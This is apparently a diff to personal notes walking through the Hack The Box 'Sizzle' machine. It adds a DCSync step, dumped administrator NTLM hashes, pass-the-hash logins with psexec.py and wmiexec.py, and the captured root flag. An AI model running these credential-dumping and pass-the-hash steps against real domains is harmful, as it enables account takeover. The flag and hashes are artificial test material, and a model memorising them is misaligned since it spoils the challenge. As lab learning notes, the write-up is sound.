@@ -153,7 +153,7 @@ Football#7
 
 
 ```
-maketoken mrlky htb Fotball#7
+maketoken mrlky htb Football#7
 ```
 ![[Pasted image 20240501034808.png]]
 
@@ -163,6 +163,40 @@ DCSync sizzle
 ```
 ![[Pasted image 20240501035039.png]]
 
-We got error with mrlky let's try with administrator
+We got error with mrlky let's try with administrator (i.e. is we want both the permission as discussed earlier and what is happening here due to wrong credentials amanda is trying to DCSync right which she don't have ) and it thinks are not working either they are broken or i have done some spelling mistake
+![[Pasted image 20240501043023.png]]
+And yes the password has wrong 
+ 
+![[Pasted image 20240501043104.png]]
+
+So this time it worked let's copy the administrator sam 
+```
+Credentials:
+  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
+    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
+    ntlm- 1: c718f548c75062ada93250db208d3178
+    lm  - 0: 336d863559a3f7e69371a85ad959a675
+```
+
+Let's try to get psexec or wmiexec or win
+
+As it is taking time which means that psexec will not work
+```
+psexec.py HTB/administrator@10.10.10.103 -hashes f6b7160bfc91823792e0ac3a162c9267:f6b7160bfc91823792e0ac3a162c9267
+```
+
+But guess what it workeddddddddddddddddddddddddd
+![[Pasted image 20240501043510.png]]
 
 
+```
+wmiexec.py HTB/administrator@10.10.10.103 -hashes f6b7160bfc91823792e0ac3a162c9267:f6b7160bfc91823792e0ac3a162c9267
+```
+![[Pasted image 20240501043616.png]]
+
+```
+\Users\administrator\Desktop>more root.txt
+f97497bfcfed8e8820fa145c31b01b41
+```
+
+So i learnt so much through this box and finally it was completed today.
